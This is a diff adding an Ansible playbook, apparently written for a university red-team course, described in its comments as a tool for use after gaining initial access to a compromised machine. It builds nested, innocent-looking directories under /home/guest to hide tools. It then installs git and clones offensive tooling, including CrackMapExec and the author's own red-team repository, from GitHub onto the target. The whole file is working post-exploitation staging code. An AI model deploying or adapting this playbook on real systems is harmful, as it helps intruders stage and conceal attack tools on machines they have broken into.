@@ -1,0 +1,59 @@
+---
+#Sean Carroll
+#red team tool to be used when initial access is gained, ansible script that will automatically create 4 directories, hidden in these directories will be any github tools that the user wants to download to the compromised machine
+#the git repo URLs can be replaced with the tools that the user wants to download
+
+ - name: "Download red team tools after initial access"
+   hosts: localhost
+   become: yes
+
+   tasks:
+    - name: "Create 1st directory"
+      file:
+       path: /home/guest
+       state: directory
+    - name: "Change into 1st directory"
+      command:
+       chdir: /home/guest
+       cmd: "clear"
+    - name: "Create 2nd directory"
+      file:
+       path: /home/guest/Downloads
+       state: directory
+    - name: "Change into 2nd directory"
+      command:
+       chdir: /home/guest/Downloads
+       cmd: "clear"
+    - name: "Create 3rd directory"
+      file:
+       path: /home/guest/Downloads/application
+       state: directory
+    - name: "Change into 3rd directory"
+      command:
+       chdir: /home/guest/Downloads/application
+       cmd: "clear"
+    - name: "Create 4th directory"
+      file:
+       path: /home/guest/Downloads/application/test
+       state: directory
+    - name: "Change into 4th directory"
+      command:
+       chdir: /home/guest/Downloads/application/test
+       cmd: "clear"
+    - name: "Install git"
+      apt:
+       name: git
+       update_cache: yes
+       state: latest
+    - name: "Install my red team tool"
+      git: 
+       repo: https://github.com/src4413/CSEC473RedTeamTools.git
+       dest: /home/guest/Downloads/application/test
+    - name: "Install CrackMapExec"
+      git: 
+       repo: https://github.com/Porchetta-Industries/CrackMapExec.git
+       dest: /home/guest/Downloads/application/test/crack
+
+
+
+
